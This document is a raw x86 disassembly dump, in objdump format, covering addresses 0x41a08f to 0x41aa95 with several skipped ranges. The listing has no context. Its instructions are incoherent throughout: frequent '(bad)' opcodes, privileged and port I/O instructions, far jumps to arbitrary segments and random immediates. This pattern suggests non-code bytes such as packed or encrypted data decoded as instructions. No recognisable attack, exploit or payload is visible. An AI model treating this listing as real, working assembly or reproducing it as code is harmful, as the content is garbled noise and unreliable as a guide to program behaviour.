  41a08f:	shr    BYTE PTR [esi+ebp*2],cl
  41a092:	xchg   ebx,eax
  41a093:	and    eax,0x3a5c62ba
  41a098:	push   ebx
  41a099:	loop   0x41a02d
  41a09b:	and    eax,0x75f7cb29
  41a0a0:	stos   BYTE PTR es:[edi],al
  41a0a1:	xchg   ecx,eax
  41a0a2:	into   
  41a0a3:	pop    edi
  41a0a4:	ja     0x41a10b
  41a0a6:	mov    bl,0xd4
  41a0a8:	sbb    BYTE PTR [esi-0x2e078149],dh
  41a0ae:	jns    0x41a052
  41a0b0:	pop    edx
  41a0b1:	das    
  41a0b2:	jmp    0x41a037
  41a0b4:	in     eax,dx
  41a0b5:	sub    eax,0xb49e9ef9
  41a0ba:	add    BYTE PTR [esi+0x47],cl
  41a0bd:	cdq    
  41a0be:	inc    esp
  41a0bf:	xchg   esp,eax
  41a0c0:	leave  
  41a0c1:	rol    DWORD PTR [esi],0x5c
  41a0c4:	mov    ds:0xc128d1b5,eax
  41a0c9:	iret   
  41a0ca:	xor    ecx,ebp
  41a0cc:	or     DWORD PTR [eax-0x17679024],esp
  41a0d2:	push   ebx
  41a0d3:	inc    esi
  41a0d4:	push   ds
  41a0d5:	jb     0x41a070
  41a0d7:	mov    eax,ds:0x3dcbbe7c
  41a0dc:	and    esp,DWORD PTR [ebx-0x1a]
  41a0df:	push   edi
  41a0e0:	(bad)  
  41a0e1:	std    
  41a0e2:	mov    ch,0xa3
  41a0e4:	sub    bh,0x35
  41a0e7:	out    dx,al
  41a0e8:	movntps XMMWORD PTR [edi+0x6a],xmm1
  41a0ec:	pop    ss
  41a0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0ee:	loop   0x41a0d4
  41a0f0:	cld    
  41a0f1:	xchg   edx,eax
  41a0f2:	mov    WORD PTR [esi+0x29],gs
  41a0f5:	inc    ecx
  41a0f6:	lahf   
  41a0f7:	in     eax,dx
  41a0f8:	adc    DWORD PTR [edi],edi
  41a0fa:	or     BYTE PTR [edx],al
  41a0fc:	out    0xbb,eax
  41a0fe:	fwait
  41a0ff:	cmp    ecx,DWORD PTR [edx]
  41a101:	xchg   ebx,eax
  41a102:	jle    0x41a0ae
  41a104:	add    edx,DWORD PTR [eax+0x20]
  41a107:	popa   
  41a108:	push   ds
  41a109:	test   al,0x86
  41a10b:	jae    0x41a182
  41a10d:	jle    0x41a09a
  41a10f:	sti    
  41a110:	lds    ebp,FWORD PTR [eax+0x757bcf30]
  41a116:	mov    al,0xfa
  41a118:	or     eax,0xd3450f74
  41a11d:	arpl   WORD PTR [eax+0x56],dx
  41a120:	inc    eax
  41a121:	fsubr  DWORD PTR ds:0x2e0e979
  41a127:	pop    ds
  41a128:	mov    bh,0x20
  41a12a:	sar    esi,0x9
  41a12d:	loop   0x41a0cf
  41a12f:	or     DWORD PTR ds:0xcd123d39,ecx
	...
  41a195:	add    BYTE PTR [esp+ecx*1],bl
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	sub    BYTE PTR [edi+0x12bb1c5d],dh
  41a1a8:	add    DWORD PTR [eax],eax
  41a1aa:	pop    es
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    BYTE PTR [edi-0x4630b83b],bh
  41a1b3:	adc    eax,0x11e65338
  41a1b8:	xor    BYTE PTR [esi-0x7a],dl
  41a1bb:	inc    ebx
  41a1bc:	push   ecx
  41a1bd:	inc    esi
  41a1be:	push   ebp
  41a1bf:	sub    eax,0xed263c8c
  41a1c4:	pusha  
  41a1c5:	retf   
  41a1c6:	enter  0x741a,0x49
  41a1ca:	push   ebp
  41a1cb:	add    al,0x19
  41a1cd:	dec    ebx
  41a1ce:	pop    ebp
  41a1cf:	mov    DWORD PTR [eax+0x44],ebx
  41a1d2:	vminss xmm6,xmm1,DWORD PTR [ecx+0x74]
  41a1d7:	test   BYTE PTR [esi],bh
  41a1d9:	call   0x5a40bf30
  41a1de:	xchg   ebp,eax
  41a1df:	or     esi,esi
  41a1e1:	inc    esi
  41a1e2:	test   DWORD PTR [eax-0x5001f1bc],ebx
  41a1e8:	out    0x3f,eax
  41a1ea:	mov    eax,0xbc1015a4
  41a1ef:	dec    ecx
  41a1f0:	pushf  
  41a1f1:	inc    esp
  41a1f2:	scas   eax,DWORD PTR es:[edi]
  41a1f3:	add    al,0x22
  41a1f5:	hlt    
  41a1f6:	fcmovnb st,st(1)
  41a1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1f9:	mov    ds:0x9ba4d4e6,al
  41a1fe:	sub    BYTE PTR [eax],dh
  41a200:	inc    edx
  41a201:	test   al,bl
  41a203:	aam    0x27
  41a205:	test   al,0xcb
  41a207:	jne    0x41a22e
  41a209:	adc    edx,DWORD PTR [edx]
  41a20b:	add    eax,0x4777d98f
  41a210:	sar    DWORD PTR [ecx],1
  41a212:	mov    edi,0x35a0fedb
  41a217:	hlt    
  41a218:	jl     0x41a276
  41a21a:	lods   al,BYTE PTR ds:[esi]
  41a21b:	lds    eax,FWORD PTR [edx-0x1]
  41a21e:	lods   al,BYTE PTR ds:[esi]
  41a21f:	push   esp
  41a220:	add    dl,BYTE PTR [ebx-0x50]
  41a223:	mov    esi,0x45b2b786
  41a228:	pusha  
  41a229:	dec    ebp
  41a22a:	ret    0x51b4
  41a22d:	call   0x7ddca1e2
  41a232:	aam    0xc6
  41a234:	adc    eax,0xa0993010
  41a239:	xor    ebx,DWORD PTR [eax-0x7fc113c2]
  41a23f:	sbb    dh,BYTE PTR [ebp+0x61275603]
  41a245:	fadd   DWORD PTR [ecx]
  41a247:	inc    edi
  41a248:	cs jg  0x41a27e
  41a24b:	xor    dl,BYTE PTR [esi]
  41a24d:	in     al,dx
  41a24e:	sub    dl,BYTE PTR [eax+0x1a]
  41a251:	and    esi,ebp
  41a253:	(bad)  
  41a254:	aad    0xbd
  41a256:	iret   
  41a257:	jb     0x41a291
  41a259:	mov    ah,0x2a
  41a25b:	sub    DWORD PTR [ebp-0x797bc72],ebx
  41a261:	imul   ecx,DWORD PTR [eax],0x2d81e32c
  41a267:	sub    DWORD PTR [ebp+0x60dc4b96],ecx
  41a26d:	sub    bh,BYTE PTR ds:0xb0f34fd4
  41a273:	push   cs
  41a274:	sti    
  41a275:	test   al,0x39
  41a277:	sbb    eax,0xdb8e4656
  41a27c:	xor    edx,DWORD PTR [eax-0x5a]
  41a27f:	adc    dh,BYTE PTR [ebx-0x3ad2b990]
  41a285:	ins    DWORD PTR es:[edi],dx
  41a286:	add    ch,bh
  41a288:	mov    ah,0x6e
  41a28a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a28c:	jp     0x41a226
  41a28e:	inc    edi
  41a28f:	push   ebx
  41a290:	sar    DWORD PTR [edx+edi*8],1
  41a293:	jmp    0x1c0a:0xf77f461a
  41a29a:	mov    edx,0x4d34d28
  41a29f:	mov    bh,0x28
  41a2a1:	cli    
  41a2a2:	jnp    0x41a2ab
  41a2a4:	push   0xfffffff5
  41a2a6:	or     bl,al
  41a2a8:	push   eax
  41a2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2aa:	mov    DWORD PTR [ecx],ebp
  41a2ac:	and    al,0x82
  41a2ae:	jae    0x41a327
  41a2b0:	mov    bl,0x8e
  41a2b2:	clc    
  41a2b3:	loope  0x41a248
	...
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax-0x7096cc3b],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [esi],bl
  41a32f:	add    DWORD PTR [ebx+0x75b81fa0],0xffffffcc
  41a336:	loope  0x41a346
  41a338:	or     esi,DWORD PTR [ecx]
  41a33a:	jle    0x41a2d3
  41a33c:	sub    al,0x75
  41a33e:	cs sbb al,0x6
  41a341:	inc    ecx
  41a342:	jo     0x41a328
  41a344:	scas   al,BYTE PTR es:[edi]
  41a345:	push   esi
  41a346:	pop    ecx
  41a347:	pop    ss
  41a348:	(bad)  
  41a349:	push   0x2c
  41a34b:	add    eax,0x3f4fc3e
  41a350:	pop    ss
  41a351:	push   ebx
  41a352:	sub    bl,dh
  41a354:	cmp    eax,0x2b29deea
  41a359:	ret    0xed6a
  41a35c:	and    al,0x6
  41a35e:	sbb    edi,0x66d34463
  41a364:	aad    0xf0
  41a366:	sbb    eax,0x94807793
  41a36b:	or     al,0xab
  41a36d:	addr16 dec edx
  41a36f:	or     bl,bl
  41a371:	fiadd  DWORD PTR [ecx]
  41a373:	add    eax,0xe5f9f076
  41a378:	adc    DWORD PTR [eax-0x1],ebp
  41a37b:	shl    BYTE PTR [eax+0x488eb8b9],1
  41a381:	fs lahf 
  41a383:	fst    DWORD PTR [ecx-0x4be0ef27]
  41a389:	retf   0xe544
  41a38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a38d:	mov    ebp,0x87b4589d
  41a392:	fs and al,0x1
  41a395:	(bad)  
  41a397:	dec    ebp
  41a398:	cmc    
  41a399:	xlat   BYTE PTR ds:[ebx]
  41a39a:	inc    esi
  41a39b:	scas   eax,DWORD PTR es:[edi]
  41a39c:	imul   BYTE PTR [eax-0x740e5bb]
  41a3a2:	push   cs
  41a3a3:	add    DWORD PTR [edi],ebx
  41a3a5:	imul   esi,DWORD PTR [ebx],0x72
  41a3a8:	in     eax,dx
  41a3a9:	xor    al,0x89
  41a3ab:	(bad)  
  41a3ad:	aas    
  41a3ae:	pop    ds
  41a3af:	nop
  41a3b0:	pop    ss
  41a3b1:	xchg   edx,eax
  41a3b2:	pop    eax
  41a3b3:	das    
  41a3b4:	cmc    
  41a3b5:	aaa    
  41a3b6:	dec    ecx
  41a3b7:	inc    DWORD PTR [ebp-0x599b9a98]
  41a3bd:	lods   al,BYTE PTR ds:[esi]
  41a3be:	push   esp
  41a3bf:	jl     0x41a362
  41a3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3c2:	jge    0x41a378
  41a3c4:	dec    eax
  41a3c5:	adc    BYTE PTR [eax-0x279596b1],dh
  41a3cb:	call   0xbe4dde89
  41a3d0:	and    al,0x59
  41a3d2:	call   0xc174dfc3
  41a3d7:	nop
  41a3d8:	je     0x41a3c2
  41a3da:	test   BYTE PTR [ebx],dh
  41a3dc:	stos   DWORD PTR es:[edi],eax
  41a3dd:	rcl    edi,cl
  41a3df:	daa    
  41a3e0:	jecxz  0x41a3eb
  41a3e2:	nop
  41a3e3:	sub    esi,DWORD PTR ss:[edx]
  41a3e6:	repz cmp BYTE PTR [ebx+0x194689cc],0xec
  41a3ee:	push   ss
  41a3ef:	jp     0x41a3f1
  41a3f1:	call   0x6340:0xf0bfaec4
  41a3f8:	imul   esp,ecx,0x3e7abfef
  41a3fe:	(bad)  
  41a3ff:	aas    
  41a400:	les    ebx,FWORD PTR [ecx]
  41a402:	dec    ebp
  41a403:	icebp  
  41a404:	sub    DWORD PTR [edx-0x4e],edx
  41a407:	je     0x41a40a
  41a409:	jmp    0x41a44f
  41a40b:	jno    0x41a476
  41a40d:	lods   eax,DWORD PTR ds:[esi]
  41a40e:	push   ebp
  41a40f:	jl     0x41a488
  41a411:	adc    DWORD PTR [ebp+0x12],edi
  41a414:	sbb    al,0xf7
  41a416:	outs   dx,DWORD PTR ds:[esi]
  41a417:	ins    DWORD PTR es:[edi],dx
  41a418:	pop    es
  41a419:	mov    al,ds:0x9c2f0fa2
  41a41e:	je     0x41a493
  41a420:	and    eax,0x88f1b893
  41a425:	fidiv  WORD PTR [eax+0x66]
  41a428:	mov    cl,0xd5
  41a42a:	jns    0x41a3b1
  41a42c:	sar    dl,1
  41a42e:	pop    es
  41a42f:	aaa    
  41a430:	jae    0x41a494
  41a432:	fist   WORD PTR ss:[ebx+0x0]
	...
  41a495:	add    BYTE PTR [edi-0xf0307e],bh
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	out    dx,eax
  41a4a3:	cmp    DWORD PTR [esp+ebx*4],edi
  41a4a6:	leave  
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    bl,al
  41a4af:	fmul   st(5),st
  41a4b1:	dec    esi
  41a4b2:	out    0xd6,eax
  41a4b4:	mov    ?,WORD PTR [ecx]
  41a4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4b7:	pop    ebp
  41a4b8:	(bad)  
  41a4b9:	fmul   DWORD PTR cs:[ebx-0x19]
  41a4bd:	into   
  41a4be:	pusha  
  41a4bf:	inc    ecx
  41a4c0:	push   esp
  41a4c1:	lea    esi,[eax-0x5c]
  41a4c4:	lods   al,BYTE PTR ds:[esi]
  41a4c5:	xchg   esi,eax
  41a4c6:	in     eax,0x6b
  41a4c8:	adc    esi,esi
  41a4ca:	xchg   ecx,ebp
  41a4cc:	rcr    ah,0xc8
  41a4cf:	push   edx
  41a4d0:	dec    ebp
  41a4d1:	repz repz add DWORD PTR [ecx+0xd],ebx
  41a4d6:	push   eax
  41a4d7:	or     al,0x5a
  41a4d9:	pushf  
  41a4da:	test   eax,0xbcb7c290
  41a4df:	and    dl,BYTE PTR [ecx]
  41a4e1:	sbb    DWORD PTR [esi+ecx*4+0x1f],edx
  41a4e5:	adc    ecx,DWORD PTR ss:[esi]
  41a4e8:	xor    bl,BYTE PTR [edx+0x5]
  41a4eb:	imul   ebx,DWORD PTR [eax],0xffffffb3
  41a4ee:	jl     0x41a472
  41a4f0:	nop
  41a4f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4f2:	test   eax,0x40a4cc41
  41a4f7:	xchg   ebp,eax
  41a4f8:	jo     0x41a4f1
  41a4fa:	jno    0x41a4c4
  41a4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4fd:	rcr    DWORD PTR [eax-0xb4ac2b4],cl
  41a503:	pushf  
  41a504:	out    0x94,al
  41a506:	call   0x76c3:0xc40fde76
  41a50d:	push   0xffffffec
  41a50f:	mov    edi,0x35cffbde
  41a514:	jbe    0x41a58c
  41a516:	hlt    
  41a517:	jnp    0x41a4e1
  41a519:	inc    edi
  41a51a:	pop    es
  41a51b:	imul   edx,DWORD PTR [ecx+0x1a387647],0xc4bf865e
  41a525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a526:	jmp    0xbf21:0xd2def97c
  41a52d:	popa   
  41a52e:	ins    DWORD PTR es:[edi],dx
  41a52f:	sub    DWORD PTR [esi+0x3d44531f],edx
  41a535:	cs aad 0xc4
  41a538:	fldcw  WORD PTR ds:0x557139eb
  41a53e:	leave  
  41a53f:	rcr    DWORD PTR [esi+0x13],0x75
  41a543:	aaa    
  41a544:	int3   
  41a545:	and    eax,0xba0e5ee6
  41a54a:	aam    0x5
  41a54c:	bound  eax,QWORD PTR [edx-0x4fde9a37]
  41a552:	pop    ebp
  41a553:	mov    ebp,0x8452e739
  41a558:	fwait
  41a559:	test   eax,0xc0e955df
  41a55e:	fdivr  st,st(7)
  41a560:	(bad)  
  41a561:	fnsave [ebp-0x2804908a]
  41a567:	cmc    
  41a568:	adc    DWORD PTR [esi+0x6ee8537d],ebp
  41a56e:	xchg   edx,eax
  41a56f:	xor    al,0x46
  41a571:	pop    eax
  41a572:	push   es
  41a573:	add    bl,0x96
  41a576:	repz out 0x66,al
  41a579:	pop    edx
  41a57a:	jbe    0x41a5ba
  41a57c:	and    eax,0x9bc357d9
  41a581:	adc    esi,DWORD PTR [ebx+0x35ae90a]
  41a587:	(bad)  [eax+0x7beb55f8]
  41a58d:	das    
  41a58e:	stos   DWORD PTR es:[edi],eax
  41a58f:	retf   
  41a590:	sahf   
  41a591:	push   esi
  41a592:	shr    BYTE PTR [eax],cl
  41a594:	or     eax,0xc0564f04
  41a599:	push   ecx
  41a59a:	add    edi,DWORD PTR [esi]
  41a59c:	das    
  41a59d:	loop   0x41a576
  41a59f:	rcr    BYTE PTR [edi+0x6e],0xbb
  41a5a3:	adc    DWORD PTR [ecx-0x2c],ebx
  41a5a6:	push   0xffffffc2
  41a5a8:	out    0xf0,eax
  41a5aa:	ds push esp
  41a5ac:	test   DWORD PTR [ecx],edx
  41a5ae:	outs   dx,DWORD PTR ds:[esi]
  41a5af:	jo     0x41a573
  41a5b1:	xor    eax,0x70e046
	...
  41a616:	pop    esp
  41a617:	sub    al,BYTE PTR [ecx]
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x23105a86
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a62f:	sahf   
  41a630:	loop   0x41a62a
  41a632:	mov    eax,0xb3e59850
  41a637:	mov    esi,0x67a5bf55
  41a63c:	jns    0x41a5be
  41a63e:	dec    BYTE PTR [ebx+ecx*1-0x62]
  41a642:	adc    ebp,DWORD PTR [ebx]
  41a644:	das    
  41a645:	enter  0xfd36,0x4f
  41a649:	scas   eax,DWORD PTR es:[edi]
  41a64a:	(bad)  
  41a64b:	aas    
  41a64c:	adc    DWORD PTR [ebx+0x616f4075],esi
  41a652:	test   DWORD PTR [edi],edi
  41a654:	cwde   
  41a655:	vpperm xmm1,xmm5,XMMWORD PTR fs:[esi],xmm0
  41a65c:	dec    esp
  41a65d:	lods   al,BYTE PTR ds:[esi]
  41a65e:	xchg   BYTE PTR [ebp-0x61],cl
  41a661:	inc    ecx
  41a662:	pusha  
  41a663:	pop    esp
  41a664:	xchg   ecx,eax
  41a665:	add    eax,ebx
  41a667:	call   0x887a:0x557dd3b8
  41a66e:	pop    eax
  41a66f:	sub    eax,edi
  41a671:	jne    0x41a605
  41a673:	jle    0x41a601
  41a675:	cmp    cl,bh
  41a677:	add    BYTE PTR [edi+0x6117a3ea],dl
  41a67d:	sbb    eax,0xb278f053
  41a682:	icebp  
  41a683:	aad    0x72
  41a685:	pop    ds
  41a686:	loop   0x41a6ab
  41a688:	int    0x7a
  41a68a:	ret    
  41a68b:	dec    ebp
  41a68c:	mov    ch,0xe0
  41a68e:	clc    
  41a68f:	inc    ecx
  41a690:	sbb    DWORD PTR [edx],esi
  41a692:	jg     0x41a6d9
  41a694:	sub    BYTE PTR [ebx],al
  41a696:	xchg   ecx,eax
  41a697:	aaa    
  41a698:	call   0x3d22bf0b
  41a69d:	sub    DWORD PTR [esi-0x7f],edi
  41a6a0:	push   esi
  41a6a1:	jp     0x41a6fa
  41a6a3:	std    
  41a6a4:	xor    ebx,DWORD PTR [ebx-0x4f766462]
  41a6aa:	xchg   ebx,eax
  41a6ab:	push   esi
  41a6ac:	jl     0x41a633
  41a6ae:	cmp    BYTE PTR [eax+0x143cf34e],bl
  41a6b4:	retf   
  41a6b5:	mov    al,0x1a
  41a6b7:	ror    BYTE PTR [ebp-0x1a723795],cl
  41a6bd:	add    dh,ch
  41a6bf:	test   eax,0xe316aa94
  41a6c4:	and    eax,0x2bb33c40
  41a6c9:	push   0x9451730e
  41a6ce:	fsub   QWORD PTR [edx-0x5ba1eb89]
  41a6d4:	and    eax,0xb1bdf1d0
  41a6d9:	out    dx,eax
  41a6da:	int3   
  41a6db:	mov    ebx,0xfb5639b9
  41a6e0:	and    DWORD PTR [ebx],esp
  41a6e2:	xchg   DWORD PTR [esi+edi*2-0x6f9a6404],ecx
  41a6e9:	jl     0x41a70f
  41a6eb:	xchg   esp,eax
  41a6ec:	je     0x41a6cc
  41a6ee:	pop    edi
  41a6ef:	(bad)  
  41a6f0:	aaa    
  41a6f1:	cmp    eax,0xa08d2b4a
  41a6f6:	cmp    al,0xce
  41a6f8:	daa    
  41a6f9:	xchg   esi,eax
  41a6fa:	aam    0xb5
  41a6fc:	mov    ds:0x7044ab89,al
  41a701:	stos   DWORD PTR es:[edi],eax
  41a702:	fnstenv [bp+di]
  41a705:	and    BYTE PTR [edx+0x1c],cl
  41a708:	adc    WORD PTR [esi],0xffc8
  41a70c:	shr    BYTE PTR [esi-0x26],1
  41a70f:	mov    edi,0x898a3c5e
  41a714:	in     eax,dx
  41a715:	clc    
  41a716:	lock cs inc eax
  41a719:	fs pop ebx
  41a71b:	sti    
  41a71c:	ss xor eax,0x7d91997c
  41a722:	jl     0x41a79c
  41a724:	cmp    ah,dl
  41a726:	sub    ch,ah
  41a728:	enter  0x301f,0xcd
  41a72c:	add    DWORD PTR [eax],ebp
  41a72e:	fs scas al,BYTE PTR es:[edi]
  41a730:	sti    
  41a731:	ins    BYTE PTR es:[edi],dx
  41a732:	pusha  
  41a733:	add    edi,ebp
	...
  41a795:	add    bl,dh
  41a797:	xchg   edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx-0x2b79af58]
  41a7a4:	jmp    0x700:0x116d7d4
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [ebp+ecx*1-0x53ce1057],dh
  41a7b4:	push   ebx
  41a7b5:	xchg   edx,eax
  41a7b6:	sbb    DWORD PTR [ecx],0x5483cc9f
  41a7bc:	dec    ebp
  41a7bd:	mov    eax,0x442f6aff
  41a7c2:	jne    0x41a765
  41a7c4:	and    ch,BYTE PTR [eax]
  41a7c6:	stos   BYTE PTR es:[edi],al
  41a7c7:	add    BYTE PTR ss:[esi+edx*4],bl
  41a7cb:	int    0xf8
  41a7cd:	clc    
  41a7ce:	mov    dl,0xfe
  41a7d0:	je     0x41a7eb
  41a7d2:	or     eax,0x8d874c7a
  41a7d7:	out    dx,eax
  41a7d8:	dec    esp
  41a7d9:	call   FWORD PTR [ebx+0x77d1f68f]
  41a7df:	xchg   esi,eax
  41a7e0:	and    eax,0x27caf4ed
  41a7e5:	lods   al,BYTE PTR ds:[esi]
  41a7e6:	dec    esi
  41a7e7:	mov    ebx,0x7a755528
  41a7ec:	xor    al,0xd0
  41a7ee:	pushf  
  41a7ef:	mov    al,ds:0x9ad95c8
  41a7f4:	adc    eax,0xb62a4122
  41a7f9:	push   edx
  41a7fa:	daa    
  41a7fb:	xor    DWORD PTR [esi-0x239d8f59],esp
  41a801:	pop    ss
  41a802:	call   0x3d2d:0xd62ceaa0
  41a809:	inc    eax
  41a80a:	mov    dh,0x84
  41a80c:	sbb    DWORD PTR [edi-0x28],ecx
  41a80f:	inc    edi
  41a810:	jae    0x41a7bf
  41a812:	jge    0x41a85d
  41a814:	cmp    DWORD PTR [ebx],eax
  41a816:	frstor ds:0xb2c3566c
  41a81c:	mov    DWORD PTR [ebp+ebp*1-0x488a4b12],ebp
  41a823:	enter  0xb823,0xac
  41a827:	pop    ds
  41a828:	pop    ebp
  41a829:	enter  0xf451,0x1a
  41a82d:	dec    eax
  41a82e:	lea    esp,ds:0x9d38358d
  41a834:	rcl    al,1
  41a836:	clc    
  41a837:	jnp    0x41a855
  41a839:	cmp    al,0xf0
  41a83b:	out    dx,al
  41a83c:	lmsw   WORD PTR [ebp-0x34]
  41a840:	icebp  
  41a841:	int    0x83
  41a843:	rol    DWORD PTR [ebx],1
  41a845:	js     0x41a88d
  41a847:	scas   al,BYTE PTR es:[edi]
  41a848:	jp     0x41a88f
  41a84a:	cld    
  41a84b:	push   ds
  41a84c:	shl    edi,1
  41a84e:	fsub   DWORD PTR [esi-0x1ac1e1b2]
  41a854:	in     eax,0x6f
  41a856:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a858:	mov    dh,0x80
  41a85a:	jo     0x41a898
  41a85c:	mov    edi,0xb5790292
  41a861:	and    eax,0x4610dcd
  41a866:	mov    ds:0x9358fcea,al
  41a86b:	cmp    cl,bh
  41a86d:	dec    ebp
  41a86e:	jns    0x41a864
  41a870:	fstp   DWORD PTR [edi+eax*4+0x2f]
  41a874:	cmp    DWORD PTR [edi],esp
  41a876:	push   ecx
  41a877:	in     eax,dx
  41a878:	jae    0x41a891
  41a87a:	mov    ebp,0x81395d25
  41a87f:	ret    0xca28
  41a882:	pop    edx
  41a883:	mov    dh,0x86
  41a885:	sbb    al,0xec
  41a887:	out    dx,eax
  41a888:	push   0x52
  41a88a:	nop
  41a88b:	lods   al,BYTE PTR ds:[esi]
  41a88c:	cmc    
  41a88d:	pop    edx
  41a88e:	push   ecx
  41a88f:	imul   edx,DWORD PTR [eax+0x7],0xffffffae
  41a893:	pop    es
  41a894:	in     eax,0xa1
  41a896:	(bad)  
  41a897:	lahf   
  41a898:	shl    ch,0x64
  41a89b:	push   ebp
  41a89c:	xor    BYTE PTR [ebx+0x2991f529],al
  41a8a2:	mov    ds,WORD PTR [ecx]
  41a8a4:	inc    edi
  41a8a5:	inc    edi
  41a8a6:	pop    eax
  41a8a7:	or     BYTE PTR [eax],dh
  41a8a9:	fs ds in eax,0x4c
  41a8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8ae:	dec    edi
  41a8af:	push   0xa42f10de
  41a8b4:	add    DWORD PTR [eax],0x0
	...
  41a916:	xor    eax,0xcf4a867e
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0x4657323e,al
  41a924:	push   edx
  41a925:	hlt    
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [esi],dh
  41a92f:	sahf   
  41a930:	cmp    DWORD PTR [esi+0x46],eax
  41a933:	pop    edx
  41a934:	mov    esp,0xb04a0754
  41a939:	xor    al,0xbc
  41a93b:	and    BYTE PTR [eax+0x38],0x42
  41a93f:	cwde   
  41a940:	ins    BYTE PTR es:[edi],dx
  41a941:	mov    ebx,0x88ea6ca1
  41a946:	test   BYTE PTR [edx+0x2e],0xa3
  41a94a:	pop    ebx
  41a94b:	adc    cl,BYTE PTR [esi]
  41a94d:	sbb    al,0xaa
  41a94f:	aad    0x49
  41a951:	ins    DWORD PTR es:[edi],dx
  41a952:	mov    al,0x9f
  41a954:	cmc    
  41a955:	jb     0x41a992
  41a957:	lock xchg bh,al
  41a95a:	stc    
  41a95b:	jg     0x41a910
  41a95d:	sbb    eax,0xb380f293
  41a962:	xchg   edi,eax
  41a963:	dec    eax
  41a964:	adc    cl,BYTE PTR [ebp+0x3675fef0]
  41a96a:	je     0x41a9b0
  41a96c:	mov    edi,0x4d0f2633
  41a971:	lea    ebx,[ebp-0x1d]
  41a974:	mov    ecx,0x2a32756d
  41a979:	fsubr  DWORD PTR [eax+edx*2+0x1942ad8b]
  41a980:	cli    
  41a981:	ja     0x41a916
  41a983:	les    edi,FWORD PTR [edx]
  41a985:	ds ins DWORD PTR es:[edi],dx
  41a987:	lock shr BYTE PTR [ecx],0xcb
  41a98b:	mov    ecx,ebx
  41a98d:	mov    ah,BYTE PTR [esi+eax*8+0x59]
  41a991:	pop    edi
  41a992:	and    DWORD PTR [eax-0x3aa03c8e],edi
  41a998:	mov    bh,0x50
  41a99a:	popf   
  41a99b:	sbb    al,0xec
  41a99d:	rcr    bh,1
  41a99f:	ins    DWORD PTR es:[edi],dx
  41a9a0:	mov    DWORD PTR [edi-0x33c8d2fa],edi
  41a9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9a7:	and    eax,0x9582013d
  41a9ac:	push   0xa9f13b26
  41a9b1:	mov    dl,0xe8
  41a9b3:	sbb    DWORD PTR [edx-0x50548830],0x2ade188d
  41a9bd:	enter  0x7526,0x9c
  41a9c1:	push   0x8434ef03
  41a9c6:	mov    eax,0x66c3222c
  41a9cb:	push   ds
  41a9cc:	add    edx,DWORD PTR [ebp+0x2c]
  41a9cf:	adc    ebp,esp
  41a9d1:	daa    
  41a9d2:	push   ebp
  41a9d3:	popf   
  41a9d4:	cwde   
  41a9d5:	cmp    eax,0x61224906
  41a9da:	jo     0x41aa09
  41a9dc:	aam    0xf6
  41a9de:	xor    edi,DWORD PTR [eax+0x3a]
  41a9e1:	mov    al,ds:0x534d57de
  41a9e6:	jl     0x41a9c5
  41a9e8:	mov    edx,0xe5f37af
  41a9ed:	inc    esi
  41a9ee:	mov    WORD PTR [ecx-0x5cb36245],ss
  41a9f4:	not    DWORD PTR [esp+edi*8+0x55]
  41a9f8:	sub    al,0x7f
  41a9fa:	dec    eax
  41a9fc:	imul   eax,DWORD PTR [ebp-0x5d],0x9c3a090a
  41aa03:	jp     0x41aa02
  41aa05:	or     ecx,DWORD PTR [esi+ebp*8-0x4cfcf84e]
  41aa0c:	dec    edi
  41aa0d:	or     DWORD PTR [ebx+eiz*1],0xffffffe4
  41aa11:	cmp    DWORD PTR [esi],ebx
  41aa13:	xchg   ebp,eax
  41aa14:	movaps xmm7,xmm3
  41aa17:	mov    ebx,0x39eb9dcb
  41aa1c:	xchg   esi,eax
  41aa1d:	push   ecx
  41aa1e:	ret    0x7bd8
  41aa21:	cmp    al,0x74
  41aa23:	sbb    BYTE PTR [edx+0x2d4eb4a0],bl
  41aa29:	xchg   ebx,eax
  41aa2a:	adc    ebp,edi
  41aa2c:	xor    cl,dh
  41aa2e:	cs mov bl,0x9a
  41aa31:	es pop ds
  41aa33:	and    al,0xd6
	...
  41aa95:	add    bh,dh
